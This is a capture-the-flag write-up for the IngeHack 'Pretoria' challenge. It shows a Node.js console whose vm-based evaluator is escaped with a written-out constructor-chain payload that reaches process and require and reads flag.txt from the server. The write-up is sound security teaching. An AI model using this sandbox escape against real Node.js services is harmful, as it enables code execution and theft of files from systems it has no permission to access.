# Pretoria:
## Introduction:
This challenge was a misc challenge, titled `Pretoria`, with a goal to escape a jail.

## Deep in the challenge:
Connecting to the given server and port `misc-chall.ingehack.ingeniums.club 6002` with `nc` give us the following output:
```
 Welcome to IngeHack ctf, guess the challenge Maker!
 Gooood luck pwner
IngeHackSuperSecureConsole> 
```
So it's starts with asking us to guess the maker of the challenge, and as we know, these challenges are made by `Team seven`, so let's try entring thier usernames:
```
IngeHackSuperSecureConsole> Akram
Wrong answer! Akram is Nooob
IngeHackSuperSecureConsole> 
```
So `Akram` didn't make this challenge, let's try `vvxhid`:
```
IngeHackSuperSecureConsole> vvxhid
const vm = require("vm");
const readline = require("readline");
const fileSystem = require("fs");
const path = require("path");

const readLine = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: "IngeHackSuperSecureConsole> ",
});

console.log(" Welcome to IngeHack ctf, guess the challenge Maker!");
console.log(" Gooood luck pwner");

readLine.prompt();
readLine
  .on("line", (line) => {
    switch (line.trim()) {
      case "vvxhid":
        const filePath = path.join(__dirname, "server.js");
        const data = fileSystem.readFileSync(filePath, "utf8");
        console.log(data);
        break;
      case "oussama":
        console.log("Nice try!");
        break;
      case "philomath213":
        console.log("Hmm?");
        break;
      case "Akram":
        console.log("Wrong answer! Akram is Nooob");
        break;
      case "Fa2y": // clear the screen
        process.stdout.write("\u001B[2J\u001B[0;0f");
        break;
      case "roacult": // quit
        readLine.close();
        break;
      default:
        try {
          const res = vm.runInContext(line, vm.createContext({}));
          console.log(res);
        } catch {
          console.log("Something went wrong");
        }
        break;
    }
    readLine.prompt();
  })
  .on("close", () => {
    console.log("Have a great day Pwner!");
    process.exit(0);
  });

IngeHackSuperSecureConsole> 
```

As we see, entering `vvxhid` gave us the source code for this challenge, which was read from the `server.js` file.

As we can see, the input we send is tested if it's one of `team seven`'s members, if it's not, it uses `vm` to create a new environment and executes whatever we give it, trying to enter `5*7` gave us the following result:
```
IngeHackSuperSecureConsole> 7*5
35
IngeHackSuperSecureConsole> 
```

So our goal is to find a way to inject  our code in order to read the `flag.txt` file.

Searching for `vm` injections, we came across this command:
```
(this.constructor.constructor('const ForeignFunction = global.constructor.constructor; const process1 = ForeignFunction("return process")(); const require1 = process1.mainModule.require; const console1 = require1("console"); const fs1 = require1("fs"); console1.log(fs1.statSync("."));'))()
```
 ... it returns the following result :
```
Stats {
  dev: 95,
  mode: 16877,
  nlink: 2,
  uid: 0,
  gid: 0,
  rdev: 0,
  blksize: 4096,
  ino: 1808793,
  size: 4096,
  blocks: 8,
  atimeMs: 1622695891344.2834,
  mtimeMs: 1622687478000,
  ctimeMs: 1622695891340.2832,
  birthtimeMs: 1622695891340.2832,
  atime: 2021-06-03T04:51:31.344Z,
  mtime: 2021-06-03T02:31:18.000Z,
  ctime: 2021-06-03T04:51:31.340Z,
  birthtime: 2021-06-03T04:51:31.340Z
}
undefined
IngeHackSuperSecureConsole> 
```

As we examine the injection, we find that it re-imports all the necessary packages in order to get the status of the current folder.

As we said before, the `vm` creates a new environment, and because of that, we have to re-`require` all the packages we need.

Changing the code we have to :
```
(this.constructor.constructor('const ForeignFunction = global.constructor.constructor; const process1 = ForeignFunction("return process")(); const require1 = process1.mainModule.require; const console1 = require1("console"); const fs1 = require1("fs"); console1.log(fs1.readFileSync("./flag.txt", "utf8"));'))()
```
we get the following:
```
IngeHack{fr0m_n0d3_2_n0d3_w3_h0p_t1ll_w3_3sc4p3}
undefined
IngeHackSuperSecureConsole>
```

and here is the flag !